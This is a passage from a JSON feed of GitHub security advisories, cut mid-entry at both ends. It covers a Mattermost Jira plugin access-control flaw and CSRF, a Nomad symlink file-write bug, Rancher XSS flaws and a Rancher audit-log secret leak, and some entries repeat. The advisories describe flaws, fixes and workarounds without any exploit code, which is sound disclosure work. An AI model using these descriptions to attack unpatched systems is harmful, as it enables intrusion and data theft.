            "content_html": "<p>Mattermost Jira Plugin handling subscriptions fails to check the security level of an incoming issue or limit it based on the user who created the subscription resulting in&nbsp;registered users on Jira being able to create webhooks that give them access to all Jira issues.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-24774\">https://nvd.nist.gov/vuln/detail/CVE-2024-24774</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost-plugin-jira/commit/5f5e084d169bf6b82d5c46a7a7eb033e1a01c6de\">https://github.com/mattermost/mattermost-plugin-jira/commit/5f5e084d169bf6b82d5c46a7a7eb033e1a01c6de</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qr8f-cjw7-838m\">https://github.com/advisories/GHSA-qr8f-cjw7-838m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qr8f-cjw7-838m",
            "title": "[github.com/mattermost/mattermost-plugin-jira] Mattermost Jira Plugin does not properly check security levels",
            "date_modified": "2024-02-09T18:18:58.000Z",
            "date_published": "2024-02-09T15:31:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qr8f-cjw7-838m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost Jira Plugin fails to protect against logout CSRF allowing an attacker to post a specially crafted message that would disconnect a user's&nbsp;Jira connection in Mattermost only by viewing the message.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23319\">https://nvd.nist.gov/vuln/detail/CVE-2024-23319</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost-plugin-jira/commit/f4cf4c6de017ef6aa4428d393b78f418dd84cd8e\">https://github.com/mattermost/mattermost-plugin-jira/commit/f4cf4c6de017ef6aa4428d393b78f418dd84cd8e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4fp6-574p-fc35\">https://github.com/advisories/GHSA-4fp6-574p-fc35</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4fp6-574p-fc35",
            "title": "[github.com/mattermost/mattermost-plugin-jira] Mattermost Jira Plugin vulnerable to Cross-Site Request Forgery",
            "date_modified": "2024-02-09T18:14:45.000Z",
            "date_published": "2024-02-09T15:31:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4fp6-574p-fc35"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>HashiCorp Nomad and Nomad Enterprise 1.5.13 up to 1.6.6, and 1.7.3 template renderer is vulnerable to arbitrary file write on the host as the Nomad client user through symlink attacks. Fixed in Nomad 1.7.4, 1.6.7, 1.5.14.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1329\">https://nvd.nist.gov/vuln/detail/CVE-2024-1329</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2024-03-nomad-vulnerable-to-arbitrary-write-through-symlink-attack\">https://discuss.hashicorp.com/t/hcsec-2024-03-nomad-vulnerable-to-arbitrary-write-through-symlink-attack</a></li>\n<li><a href=\"https://github.com/hashicorp/nomad/issues/19888\">https://github.com/hashicorp/nomad/issues/19888</a></li>\n<li><a href=\"https://github.com/hashicorp/nomad/commit/b3209cbc6921e703b0e9984ce70c10b378665834\">https://github.com/hashicorp/nomad/commit/b3209cbc6921e703b0e9984ce70c10b378665834</a></li>\n<li><a href=\"https://github.com/hashicorp/nomad/commit/d1721c7a6fc1833778086603f818a822a34f445a\">https://github.com/hashicorp/nomad/commit/d1721c7a6fc1833778086603f818a822a34f445a</a></li>\n<li><a href=\"https://github.com/hashicorp/nomad/commit/de55da677a21ac7572c0f4a8cd9abd5473c47a70\">https://github.com/hashicorp/nomad/commit/de55da677a21ac7572c0f4a8cd9abd5473c47a70</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c866-8gpw-p3mv\">https://github.com/advisories/GHSA-c866-8gpw-p3mv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c866-8gpw-p3mv",
            "title": "[github.com/hashicorp/nomad] HashiCorp Nomad vulnerable to symlink attacks",
            "date_modified": "2024-02-09T15:08:41.000Z",
            "date_published": "2024-02-08T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c866-8gpw-p3mv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>HashiCorp Nomad and Nomad Enterprise 1.5.13 up to 1.6.6, and 1.7.3 template renderer is vulnerable to arbitrary file write on the host as the Nomad client user through symlink attacks. Fixed in Nomad 1.7.4, 1.6.7, 1.5.14.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1329\">https://nvd.nist.gov/vuln/detail/CVE-2024-1329</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2024-03-nomad-vulnerable-to-arbitrary-write-through-symlink-attack\">https://discuss.hashicorp.com/t/hcsec-2024-03-nomad-vulnerable-to-arbitrary-write-through-symlink-attack</a></li>\n<li><a href=\"https://github.com/hashicorp/nomad/issues/19888\">https://github.com/hashicorp/nomad/issues/19888</a></li>\n<li><a href=\"https://github.com/hashicorp/nomad/commit/b3209cbc6921e703b0e9984ce70c10b378665834\">https://github.com/hashicorp/nomad/commit/b3209cbc6921e703b0e9984ce70c10b378665834</a></li>\n<li><a href=\"https://github.com/hashicorp/nomad/commit/d1721c7a6fc1833778086603f818a822a34f445a\">https://github.com/hashicorp/nomad/commit/d1721c7a6fc1833778086603f818a822a34f445a</a></li>\n<li><a href=\"https://github.com/hashicorp/nomad/commit/de55da677a21ac7572c0f4a8cd9abd5473c47a70\">https://github.com/hashicorp/nomad/commit/de55da677a21ac7572c0f4a8cd9abd5473c47a70</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c866-8gpw-p3mv\">https://github.com/advisories/GHSA-c866-8gpw-p3mv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c866-8gpw-p3mv",
            "title": "[github.com/hashicorp/nomad] HashiCorp Nomad vulnerable to symlink attacks",
            "date_modified": "2024-02-09T15:08:41.000Z",
            "date_published": "2024-02-08T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c866-8gpw-p3mv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>HashiCorp Nomad and Nomad Enterprise 1.5.13 up to 1.6.6, and 1.7.3 template renderer is vulnerable to arbitrary file write on the host as the Nomad client user through symlink attacks. Fixed in Nomad 1.7.4, 1.6.7, 1.5.14.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1329\">https://nvd.nist.gov/vuln/detail/CVE-2024-1329</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2024-03-nomad-vulnerable-to-arbitrary-write-through-symlink-attack\">https://discuss.hashicorp.com/t/hcsec-2024-03-nomad-vulnerable-to-arbitrary-write-through-symlink-attack</a></li>\n<li><a href=\"https://github.com/hashicorp/nomad/issues/19888\">https://github.com/hashicorp/nomad/issues/19888</a></li>\n<li><a href=\"https://github.com/hashicorp/nomad/commit/b3209cbc6921e703b0e9984ce70c10b378665834\">https://github.com/hashicorp/nomad/commit/b3209cbc6921e703b0e9984ce70c10b378665834</a></li>\n<li><a href=\"https://github.com/hashicorp/nomad/commit/d1721c7a6fc1833778086603f818a822a34f445a\">https://github.com/hashicorp/nomad/commit/d1721c7a6fc1833778086603f818a822a34f445a</a></li>\n<li><a href=\"https://github.com/hashicorp/nomad/commit/de55da677a21ac7572c0f4a8cd9abd5473c47a70\">https://github.com/hashicorp/nomad/commit/de55da677a21ac7572c0f4a8cd9abd5473c47a70</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c866-8gpw-p3mv\">https://github.com/advisories/GHSA-c866-8gpw-p3mv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c866-8gpw-p3mv",
            "title": "[github.com/hashicorp/nomad] HashiCorp Nomad vulnerable to symlink attacks",
            "date_modified": "2024-02-09T15:08:41.000Z",
            "date_published": "2024-02-08T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c866-8gpw-p3mv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A vulnerability has been identified in which unauthenticated cross-site scripting (XSS) in the API Server's public API endpoint can be exploited. This can lead to an attacker exploiting the vulnerability to trigger JavaScript code and execute commands remotely. </p>\n<p>The attack vector was identified as a Reflected XSS.</p>\n<p>API Server propagates malicious payloads from user input to the UI, which renders the output. For example, a malicious URL gets rendered into a script that is executed on a page.</p>\n<p>The changes addressed by this fix are:</p>\n<ul>\n<li>Encode input that comes from the request URL before adding it to the response.</li>\n<li>The request input is escaped by changing the URL construction that is used for links to use <code>url.URL</code>.</li>\n<li>The request input is escaped by escaping the JavaScript and CSS variables with attribute encoding as defined by <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding-rules-summary\">OWASP</a>.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched versions include the following commits:</p>\n<table>\n<thead>\n<tr>\n<th>Branch</th>\n<th>Commit</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>master</td>\n<td>4fd7d82</td>\n</tr>\n<tr>\n<td>release/v2.8</td>\n<td>69b3c2b</td>\n</tr>\n<tr>\n<td>release/v2.8.s3</td>\n<td>a3b9e37</td>\n</tr>\n<tr>\n<td>release/v2.7</td>\n<td>4e102cf</td>\n</tr>\n<tr>\n<td>release/v2.7.s3</td>\n<td>97a10a3</td>\n</tr>\n<tr>\n<td>release/v2.6</td>\n<td>4df268e</td>\n</tr>\n</tbody></table>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no direct mitigation besides updating API Server to a patched version.</p>\n<h3 id=\"references\">References</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Reach out to the <a href=\"https://github.com/rancher/rancher/security/policy\">SUSE Rancher Security team</a> for security-related inquiries.</li>\n<li>Open an issue in the <a href=\"https://github.com/rancher/rancher/issues/new/choose\">Rancher</a> repository.</li>\n<li>Verify with our <a href=\"https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/\">support matrix</a> and <a href=\"https://www.suse.com/lifecycle/\">product support lifecycle</a>.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rancher/apiserver/security/advisories/GHSA-833m-37f7-jq55\">https://github.com/rancher/apiserver/security/advisories/GHSA-833m-37f7-jq55</a></li>\n<li><a href=\"https://github.com/rancher/apiserver/commit/4df268e250f625fa323349062636496e0aeff4e4\">https://github.com/rancher/apiserver/commit/4df268e250f625fa323349062636496e0aeff4e4</a></li>\n<li><a href=\"https://github.com/rancher/apiserver/commit/4e102cf0d07b1af3d10d82c3e5a751a869b8a6c7\">https://github.com/rancher/apiserver/commit/4e102cf0d07b1af3d10d82c3e5a751a869b8a6c7</a></li>\n<li><a href=\"https://github.com/rancher/apiserver/commit/4fd7d821d952510bfe38c9d4a3e2a65157f50525\">https://github.com/rancher/apiserver/commit/4fd7d821d952510bfe38c9d4a3e2a65157f50525</a></li>\n<li><a href=\"https://github.com/rancher/apiserver/commit/69b3c2b56f3fa5a421889c533dada8cd08783cda\">https://github.com/rancher/apiserver/commit/69b3c2b56f3fa5a421889c533dada8cd08783cda</a></li>\n<li><a href=\"https://github.com/rancher/apiserver/commit/97a10a30200cb851afd8ee85ee6b2295c4b6e5ee\">https://github.com/rancher/apiserver/commit/97a10a30200cb851afd8ee85ee6b2295c4b6e5ee</a></li>\n<li><a href=\"https://github.com/rancher/apiserver/commit/a3b9e3721c1b558ee63aec9594e37c223a5c8437\">https://github.com/rancher/apiserver/commit/a3b9e3721c1b558ee63aec9594e37c223a5c8437</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-833m-37f7-jq55\">https://github.com/advisories/GHSA-833m-37f7-jq55</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-833m-37f7-jq55",
            "title": "[github.com/rancher/apiserver] Rancher API Server Cross-site Scripting Vulnerability",
            "date_modified": "2024-02-09T16:07:24.000Z",
            "date_published": "2024-02-08T18:46:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-833m-37f7-jq55"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A vulnerability has been identified in which unauthenticated cross-site scripting (XSS) in Norman's public API endpoint can be exploited. This can lead to an attacker exploiting the vulnerability to trigger JavaScript code and execute commands remotely. </p>\n<p>The attack vector was identified as a Reflected XSS.</p>\n<p>Norman API propagates malicious payloads from user input to the UI, which renders the output. For example, a malicious URL gets rendered into a script that is executed on a page.</p>\n<p>The changes addressed by this fix are:</p>\n<ul>\n<li>Encode input that comes from the request URL before adding it to the response.</li>\n<li>The request input is escaped by changing the URL construction that is used for links to use <code>url.URL</code>.</li>\n<li>The request input is escaped by escaping the JavaScript and CSS variables with attribute encoding as defined by <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding-rules-summary\">OWASP</a>.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched versions include the following commits:</p>\n<table>\n<thead>\n<tr>\n<th>Branch</th>\n<th>Commit</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>master</td>\n<td>3bb70b7</td>\n</tr>\n<tr>\n<td>release/v2.8</td>\n<td>a6a6cf5</td>\n</tr>\n<tr>\n<td>release/v2.7</td>\n<td>cb54924</td>\n</tr>\n<tr>\n<td>release/v2.7.s3</td>\n<td>7b2b467</td>\n</tr>\n<tr>\n<td>release/v2.6</td>\n<td>bd13c65</td>\n</tr>\n</tbody></table>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no direct mitigation besides updating Norman API to a patched version.</p>\n<h3 id=\"references\">References</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Reach out to the <a href=\"https://github.com/rancher/rancher/security/policy\">SUSE Rancher Security team</a> for security-related inquiries.</li>\n<li>Open an issue in the <a href=\"https://github.com/rancher/rancher/issues/new/choose\">Rancher</a> repository.</li>\n<li>Verify with our <a href=\"https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/\">support matrix</a> and <a href=\"https://www.suse.com/lifecycle/\">product support lifecycle</a>.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rancher/norman/security/advisories/GHSA-r8f4-hv23-6qp6\">https://github.com/rancher/norman/security/advisories/GHSA-r8f4-hv23-6qp6</a></li>\n<li><a href=\"https://github.com/rancher/norman/commit/3bb70b772b52297feac64f5fdeb1b13c06c37e39\">https://github.com/rancher/norman/commit/3bb70b772b52297feac64f5fdeb1b13c06c37e39</a></li>\n<li><a href=\"https://github.com/rancher/norman/commit/7b2b467995e6dfab6d4a5dee8dffc15033ae8269\">https://github.com/rancher/norman/commit/7b2b467995e6dfab6d4a5dee8dffc15033ae8269</a></li>\n<li><a href=\"https://github.com/rancher/norman/commit/a6a6cf5696088c32002953d36b75bdcc84f2399e\">https://github.com/rancher/norman/commit/a6a6cf5696088c32002953d36b75bdcc84f2399e</a></li>\n<li><a href=\"https://github.com/rancher/norman/commit/bd13c653293b9b5e0b37e8a6ccd1c3277f4623ed\">https://github.com/rancher/norman/commit/bd13c653293b9b5e0b37e8a6ccd1c3277f4623ed</a></li>\n<li><a href=\"https://github.com/rancher/norman/commit/cb54924f25c7666511a913cd41834299ef22dba4\">https://github.com/rancher/norman/commit/cb54924f25c7666511a913cd41834299ef22dba4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r8f4-hv23-6qp6\">https://github.com/advisories/GHSA-r8f4-hv23-6qp6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r8f4-hv23-6qp6",
            "title": "[github.com/rancher/norman] Norman API Cross-site Scripting Vulnerability",
            "date_modified": "2024-02-09T16:07:06.000Z",
            "date_published": "2024-02-08T18:45:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r8f4-hv23-6qp6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A vulnerability has been identified which may lead to sensitive data being leaked into Rancher's audit logs. <a href=\"https://ranchermanager.docs.rancher.com/how-to-guides/advanced-user-guides/enable-api-audit-log\">Rancher Audit Logging</a> is an opt-in feature, only deployments that have it enabled and have <a href=\"https://ranchermanager.docs.rancher.com/how-to-guides/advanced-user-guides/enable-api-audit-log#audit-log-levels\">AUDIT_LEVEL</a> set to <code>1 or above</code> are impacted by this issue.</p>\n<p>The leaks might be caught in the audit logs upon these actions:</p>\n<ul>\n<li>Creating cloud credentials or new authentication providers. It is crucial to note that <strong>all</strong> <a href=\"https://ranchermanager.docs.rancher.com/pages-for-subheaders/authentication-config#external-vs-local-authentication\">authentication providers</a> (such as AzureAD) and <a href=\"https://ranchermanager.docs.rancher.com/pages-for-subheaders/set-up-cloud-providers\">cloud providers</a> (such as Google) are impacted. </li>\n<li>Downloading a kubeconfig file from a downstream or a local cluster.</li>\n<li>Logging in/out from Rancher.</li>\n</ul>\n<p>The affected data may include the following:</p>\n<ul>\n<li>HTTP headers</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Field</th>\n<th>Location</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>X-Api-Auth-Header</td>\n<td>Request header</td>\n</tr>\n<tr>\n<td>X-Api-Set-Cookie-Header</td>\n<td>Response header</td>\n</tr>\n<tr>\n<td>X-Amz-Security-Token</td>\n<td>Request header</td>\n</tr>\n<tr>\n<td>credentials</td>\n<td>Request body</td>\n</tr>\n<tr>\n<td>applicationSecret</td>\n<td>Request Body</td>\n</tr>\n<tr>\n<td>oauthCredential</td>\n<td>Request Body</td>\n</tr>\n<tr>\n<td>serviceAccountCredential</td>\n<td>Request Body</td>\n</tr>\n<tr>\n<td>spKey</td>\n<td>Request Body</td>\n</tr>\n<tr>\n<td>spCert</td>\n<td>Request body</td>\n</tr>\n<tr>\n<td>spCert</td>\n<td>Response body</td>\n</tr>\n<tr>\n<td>certificate</td>\n<td>Request body</td>\n</tr>\n<tr>\n<td>privateKey</td>\n<td>Request body</td>\n</tr>\n</tbody></table>\n<ul>\n<li>API Server calls returning <code>Secret</code> objects (including sub-types, such as <code>kubernetes.io/dockerconfigjson</code>).</li>\n<li>Raw command lines used by agents to connect to the Rancher server which expose sensitive information (e.g. <code>register ... --token abc</code>).</li>\n<li><code>Kubeconfig</code> contents when the 'Download KubeConfig' feature is used in the Rancher UI.</li>\n</ul>\n<p>The patched versions will redact the sensitive data, replacing it with <code>[redacted]</code>, making it safer for consumption. It is recommended that static secrets are rotated after the system is patched, to limit the potential impact of sensitive data being misused due to this vulnerability.</p>\n<p><strong>Note:</strong></p>\n<ol>\n<li>The severity of the vulnerability is intricately tied to the logging strategy employed. If logs are kept locally (default configuration), the impact is contained within the system, limiting the exposure.\nHowever, when logs are shipped to an external endpoint, the vulnerability's severity might increase, as resistance against leaks is contingent on the security measures implemented at the external log collector level.</li>\n<li>The final impact severity for confidentiality, integrity and availability is dependent on the permissions that the leaked credentials have on their own services.</li>\n</ol>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched versions include releases <code>2.6.14</code>, <code>2.7.10</code> and <code>2.8.2</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If <code>AUDIT_LEVEL</code> <code>1 or above</code> is required and you cannot update to a patched Rancher version, ensure that the log is handled appropriately and it is not shared with other users or shipped into a log ingestion solution without the appropriate RBAC enforcement. Otherwise, disabling the Audit feature or decreasing it to the audit level <code>0</code>, mitigates the issue.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Reach out to the <a href=\"https://github.com/rancher/rancher/security/policy\">SUSE Rancher Security team</a> for security related inquiries.</li>\n<li>Open an issue in the <a href=\"https://github.com/rancher/rancher/issues/new/choose\">Rancher</a> repository.</li>\n<li>Verify with our <a href=\"https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/\">support matrix</a> and <a href=\"https://www.suse.com/lifecycle/\">product support lifecycle</a>.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rancher/rancher/security/advisories/GHSA-xfj7-qf8w-2gcr\">https://github.com/rancher/rancher/security/advisories/GHSA-xfj7-qf8w-2gcr</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xfj7-qf8w-2gcr\">https://github.com/advisories/GHSA-xfj7-qf8w-2gcr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xfj7-qf8w-2gcr",
            "title": "[github.com/rancher/rancher] Rancher 'Audit Log' leaks sensitive information",
            "date_modified": "2024-02-08T18:44:26.000Z",
            "date_published": "2024-02-08T18:44:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xfj7-qf8w-2gcr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A vulnerability has been identified which may lead to sensitive data being leaked into Rancher's audit logs. <a href=\"https://ranchermanager.docs.rancher.com/how-to-guides/advanced-user-guides/enable-api-audit-log\">Rancher Audit Logging</a> is an opt-in feature, only deployments that have it enabled and have <a href=\"https://ranchermanager.docs.rancher.com/how-to-guides/advanced-user-guides/enable-api-audit-log#audit-log-levels\">AUDIT_LEVEL</a> set to <code>1 or above</code> are impacted by this issue.</p>\n<p>The leaks might be caught in the audit logs upon these actions:</p>\n<ul>\n<li>Creating cloud credentials or new authentication providers. It is crucial to note that <strong>all</strong> <a href=\"https://ranchermanager.docs.rancher.com/pages-for-subheaders/authentication-config#external-vs-local-authentication\">authentication providers</a> (such as AzureAD) and <a href=\"https://ranchermanager.docs.rancher.com/pages-for-subheaders/set-up-cloud-providers\">cloud providers</a> (such as Google) are impacted. </li>\n<li>Downloading a kubeconfig file from a downstream or a local cluster.</li>\n<li>Logging in/out from Rancher.</li>\n</ul>\n<p>The affected data may include the following:</p>\n<ul>\n<li>HTTP headers</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Field</th>\n<th>Location</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>X-Api-Auth-Header</td>\n<td>Request header</td>\n</tr>\n<tr>\n<td>X-Api-Set-Cookie-Header</td>\n<td>Response header</td>\n</tr>\n<tr>\n<td>X-Amz-Security-Token</td>\n<td>Request header</td>\n</tr>\n<tr>\n<td>credentials</td>\n<td>Request body</td>\n</tr>\n<tr>\n<td>applicationSecret</td>\n<td>Request Body</td>\n</tr>\n<tr>\n<td>oauthCredential</td>\n<td>Request Body</td>\n</tr>\n<tr>\n<td>serviceAccountCredential</td>\n<td>Request Body</td>\n</tr>\n<tr>\n<td>spKey</td>\n<td>Request Body</td>\n</tr>\n<tr>\n<td>spCert</td>\n<td>Request body</td>\n</tr>\n<tr>\n<td>spCert</td>\n<td>Response body</td>\n</tr>\n<tr>\n<td>certificate</td>\n<td>Request body</td>\n</tr>\n<tr>\n<td>privateKey</td>\n<td>Request body</td>\n</tr>\n</tbody></table>\n<ul>\n<li>API Server calls returning <code>Secret</code> objects (including sub-types, such as <code>kubernetes.io/dockerconfigjson</code>).</li>\n<li>Raw command lines used by agents to connect to the Rancher server which expose sensitive information (e.g. <code>register ... --token abc</code>).</li>\n<li><code>Kubeconfig</code> contents when the 'Download KubeConfig' feature is used in the Rancher UI.</li>\n</ul>\n<p>The patched versions will redact the sensitive data, replacing it with <code>[redacted]</code>, making it safer for consumption. It is recommended that static secrets are rotated after the system is patched, to limit the potential impact of sensitive data being misused due to this vulnerability.</p>\n<p><strong>Note:</strong></p>\n<ol>\n<li>The severity of the vulnerability is intricately tied to the logging strategy employed. If logs are kept locally (default configuration), the impact is contained within the system, limiting the exposure.\nHowever, when logs are shipped to an external endpoint, the vulnerability's severity might increase, as resistance against leaks is contingent on the security measures implemented at the external log collector level.</li>\n<li>The final impact severity for confidentiality, integrity and availability is dependent on the permissions that the leaked credentials have on their own services.</li>\n</ol>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched versions include releases <code>2.6.14</code>, <code>2.7.10</code> and <code>2.8.2</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If <code>AUDIT_LEVEL</code> <code>1 or above</code> is required and you cannot update to a patched Rancher version, ensure that the log is handled appropriately and it is not shared with other users or shipped into a log ingestion solution without the appropriate RBAC enforcement. Otherwise, disabling the Audit feature or decreasing it to the audit level <code>0</code>, mitigates the issue.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Reach out to the <a href=\"https://github.com/rancher/rancher/security/policy\">SUSE Rancher Security team</a> for security related inquiries.</li>\n<li>Open an issue in the <a href=\"https://github.com/rancher/rancher/issues/new/choose\">Rancher</a> repository.</li>\n<li>Verify with our <a href=\"https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/\">support matrix</a> and <a href=\"https://www.suse.com/lifecycle/\">product support lifecycle</a>.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rancher/rancher/security/advisories/GHSA-xfj7-qf8w-2gcr\">https://github.com/rancher/rancher/security/advisories/GHSA-xfj7-qf8w-2gcr</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xfj7-qf8w-2gcr\">https://github.com/advisories/GHSA-xfj7-qf8w-2gcr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xfj7-qf8w-2gcr",
            "title": "[github.com/rancher/rancher] Rancher 'Audit Log' leaks sensitive information",
            "date_modified": "2024-02-08T18:44:26.000Z",
            "date_published": "2024-02-08T18:44:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xfj7-qf8w-2gcr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A vulnerability has been identified which may lead to sensitive data being leaked into Rancher's audit logs. <a href=\"https://ranchermanager.docs.rancher.com/how-to-guides/advanced-user-guides/enable-api-audit-log\">Rancher Audit Logging</a> is an opt-in feature, only deployments that have it enabled and have <a href=\"https://ranchermanager.docs.rancher.com/how-to-guides/advanced-user-guides/enable-api-audit-log#audit-log-levels\">AUDIT_LEVEL</a> set to <code>1 or above</code> are impacted by this issue.</p>\n<p>The leaks might be caught in the audit logs upon these actions:</p>\n<ul>\n<li>Creating cloud credentials or new authentication providers. It is crucial to note that <strong>all</strong> <a href=\"https://ranchermanager.docs.rancher.com/pages-for-subheaders/authentication-config#external-vs-local-authentication\">authentication providers</a> (such as AzureAD) and <a href=\"https://ranchermanager.docs.rancher.com/pages-for-subheaders/set-up-cloud-providers\">cloud providers</a> (such as Google) are impacted. </li>\n<li>Downloading a kubeconfig file from a downstream or a local cluster.</li>\n<li>Logging in/out from Rancher.</li>\n</ul>\n<p>The affected data may include the following:</p>\n<ul>\n<li>HTTP headers</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Field</th>\n<th>Location</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>X-Api-Auth-Header</td>\n<td>Request header</td>\n</tr>\n<tr>\n<td>X-Api-Set-Cookie-Header</td>\n<td>Response header</td>\n</tr>\n<tr>\n<td>X-Amz-Security-Token</td>\n<td>Request header</td>\n</tr>\n<tr>\n<td>credentials</td>\n<td>Request body</td>\n</tr>\n<tr>\n<td>applicationSecret</td>\n<td>Request Body</td>\n</tr>\n<tr>\n<td>oauthCredential</td>\n<td>Request Body</td>\n</tr>\n<tr>\n<td>serviceAccountCredential</td>\n<td>Request Body</td>\n</tr>\n<tr>\n<td>spKey</td>\n<td>Request Body</td>\n</tr>\n<tr>\n<td>spCert</td>\n<td>Request body</td>\n</tr>\n<tr>\n<td>spCert</td>\n<td>Response body</td>\n</tr>\n<tr>\n<td>certificate</td>\n<td>Request body</td>\n</tr>\n<tr>\n<td>privateKey</td>\n<td>Request body</td>\n</tr>\n</tbody></table>\n<ul>\n<li>API Server calls returning <code>Secret</code> objects (including sub-types, such as <code>kubernetes.io/dockerconfigjson</code>).</li>\n<li>Raw command lines used by agents to connect to the Rancher server which expose sensitive information (e.g. <code>register ... --token abc</code>).</li>\n<li><code>Kubeconfig</code> contents when the 'Download KubeConfig' feature is used in the Rancher UI.</li>\n</ul>\n<p>The patched versions will redact the sensitive data, replacing it with <code>[redacted]</code>, making it safer for consumption. It is recommended that static secrets are rotated after the system is patched, to limit the potential impact of sensitive data being misused due to this vulnerability.</p>\n<p><strong>Note:</strong></p>\n<ol>\n<li>The severity of the vulnerability is intricately tied to the logging strategy employed. If logs are kept locally (default configuration), the impact is contained within the system, limiting the exposure.\nHowever, when logs are shipped to an external endpoint, the vulnerability's severity might increase, as resistance against leaks is contingent on the security measures implemented at the external log collector level.</li>\n<li>The final impact severity for confidentiality, integrity and availability is dependent on the permissions that the leaked credentials have on their own services.</li>\n</ol>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched versions include releases <code>2.6.14</code>, <code>2.7.10</code> and <code>2.8.2</code>.</p>\n<h3 